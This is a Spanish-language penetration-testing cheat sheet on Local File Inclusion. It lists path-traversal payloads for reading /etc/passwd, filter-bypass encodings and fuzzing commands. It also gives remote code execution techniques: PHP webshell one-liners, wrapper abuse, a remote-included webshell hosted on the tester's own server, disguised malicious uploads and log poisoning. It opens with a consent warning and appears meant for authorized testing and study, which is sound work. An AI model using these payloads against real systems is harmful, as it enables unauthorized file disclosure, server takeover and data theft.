
# Local File Inclusion

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Path Traversal</mark>

Podemos utilizar BurpSuite y escanear una petición, buscando un parámetro tipo:

```
?page=
```

Suele pasar mucho en páginas en php y que tengan varios idiomas.

### Inyectamos parámetro en URL

Para acceder al archivo passwd podríamos añadir en la URL:

```
?page=../../../../../etc/passwd
```

### Automatizar con Gobuster

Podemos automatizar el proceso de búsqueda de un Local File Inclusion con Gobuster y el diccionario `LFI-Jhaddix.txt` de las Seclists:

```bash
gobuster fuzz -u http://example.com/shop/?archivo=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --exclude-length 1112
```

## <mark style="color:purple;">LFI Suite</mark>

{% embed url="<https://github.com/D35m0nd142/LFISuite>" %}

LFI Suite es una herramienta de código abierto diseñada para automatizar y facilitar la identificación y explotación de vulnerabilidades de Inclusión de Archivos Locales (LFI) en aplicaciones web.

### Instalación y uso

```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python lfi.py
```

## <mark style="color:purple;">Guia rápida</mark>

<table data-header-hidden><thead><tr><th width="474"></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td> <mark style="color:purple;"><strong>Basic LFI</strong></mark></td><td></td></tr><tr><td> <code>/index.php?language=/etc/passwd</code></td><td>LFI Básico</td></tr><tr><td> <code>/index.php?language=../../../../etc/passwd</code></td><td>LFI con path traversal</td></tr><tr><td> <code>/index.php?language=/../../../etc/passwd</code></td><td>LFI con name prefix</td></tr><tr><td> <code>/index.php?language=./languages/../../../../etc/passwd</code></td><td>LFI con approved path</td></tr><tr><td> <mark style="color:purple;"><strong>LFI Bypasses</strong></mark></td><td></td></tr><tr><td> <code>/index.php?language=....//....//....//....//etc/passwd</code></td><td>Bypass basic path traversal filter</td></tr><tr><td> <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td><td>Bypass de filtros con URL encoding</td></tr><tr><td> <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td><td>Bypass appended extension con path truncation (obsoleto)</td></tr><tr><td> <code>/index.php?language=../../../../etc/passwd%00</code></td><td>Bypass appended extension con null byte (obsoleto)</td></tr><tr><td> <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td><td>Leer PHP con filtro base64</td></tr></tbody></table>

### <mark style="color:purple;">Remote Code Execution</mark>

<table data-header-hidden><thead><tr><th width="476"></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td> <mark style="color:purple;"><strong>PHP Wrappers</strong></mark></td><td></td></tr><tr><td> <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&#x26;cmd=id</code></td><td>RCE con data wrapper</td></tr><tr><td> <code>curl -s -X POST --data '&#x3C;?php system($_GET["cmd"]); ?>' "http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=php://input&#x26;cmd=id"</code></td><td>RCE con input wrapper</td></tr><tr><td> <code>curl -s "http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=expect://id"</code></td><td>RCE con expect wrapper</td></tr><tr><td> <strong>RFI</strong></td><td></td></tr><tr><td> <code>echo '&#x3C;?php system($_GET["cmd"]); ?>' > shell.php &#x26;&#x26; python3 -m http.server &#x3C;LISTENING_PORT></code></td><td>Host webshell</td></tr><tr><td> <code>/index.php?language=http://&#x3C;OUR_IP>:&#x3C;LISTENING_PORT>/shell.php&#x26;cmd=id</code></td><td>Include remote PHP web shell</td></tr><tr><td> <strong>LFI + Upload</strong></td><td></td></tr><tr><td> <code>echo 'GIF8&#x3C;?php system($_GET["cmd"]); ?>' > shell.gif</code></td><td>Crear imagen maliciosa</td></tr><tr><td> <code>/index.php?language=./profile_images/shell.gif&#x26;cmd=id</code></td><td>RCE con imagen subida maliciosa</td></tr><tr><td> <code>echo '&#x3C;?php system($_GET["cmd"]); ?>' > shell.php &#x26;&#x26; zip shell.jpg shell.php</code></td><td>Crear un archivo zip malicioso 'como jpg'</td></tr><tr><td> <code>/index.php?language=zip://shell.zip%23shell.php&#x26;cmd=id</code></td><td>RCE con zip subido malicioso</td></tr><tr><td> <code>php --define phar.readonly=0 shell.php &#x26;&#x26; mv shell.phar shell.jpg</code></td><td>Crear phar malicioso 'como jpg'</td></tr><tr><td> <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&#x26;cmd=id</code></td><td>RCE con phar subido malicioso</td></tr><tr><td> <mark style="color:purple;"><strong>Log Poisoning</strong></mark></td><td></td></tr><tr><td> <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td><td>Leer los parámetros de la sesión PHP</td></tr><tr><td> <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td><td>Envenenar Sesión PHP con webshell</td></tr><tr><td> <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&#x26;cmd=id</code></td><td>RCE a través de una Sesión PHP envenenada</td></tr><tr><td> <code>curl -s "http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php" -A '&#x3C;?php system($_GET["cmd"]); ?>'</code></td><td>Poison server log</td></tr><tr><td> <code>/index.php?language=/var/log/apache2/access.log&#x26;cmd=id</code></td><td>RCE a través de una Sesión PHP envenenada</td></tr></tbody></table>

### <mark style="color:purple;">Fuzzing</mark>

<table data-header-hidden><thead><tr><th width="479"></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td> <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?FUZZ=value' -fs 2287</code></td><td>Fuzz page parameters</td></tr><tr><td> <code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=FUZZ' -fs 2287</code></td><td>Fuzz LFI payloads</td></tr><tr><td> <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td><td>Fuzz webroot path</td></tr><tr><td> <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=../../../../FUZZ' -fs 2287</code></td><td>Fuzz server configurations</td></tr><tr><td> <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlists</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></td><td></td></tr><tr><td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></td><td></td></tr><tr><td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></td><td></td></tr></tbody></table>

### <mark style="color:purple;">File Inclusion Functions</mark>

<table data-header-hidden><thead><tr><th width="298"></th><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td><strong>Función</strong></td><td align="center"><strong>Leer contenido</strong></td><td align="center"><strong>Ejecutar contenido</strong></td><td align="center"><strong>URL remota</strong></td></tr><tr><td><mark style="color:purple;"><strong>PHP</strong></mark></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><code>require()</code>/<code>require_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td><code>file_get_contents()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><code>fopen()</code>/<code>file()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><mark style="color:purple;"><strong>NodeJS</strong></mark></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>fs.readFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>fs.sendFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>res.render()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td><mark style="color:purple;"><strong>Java</strong></mark></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>import</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><mark style="color:purple;"><strong>.NET</strong></mark></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>@Html.Partial()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>@Html.RemotePartial()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td><code>Response.WriteFile()</code></td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr></tbody></table>
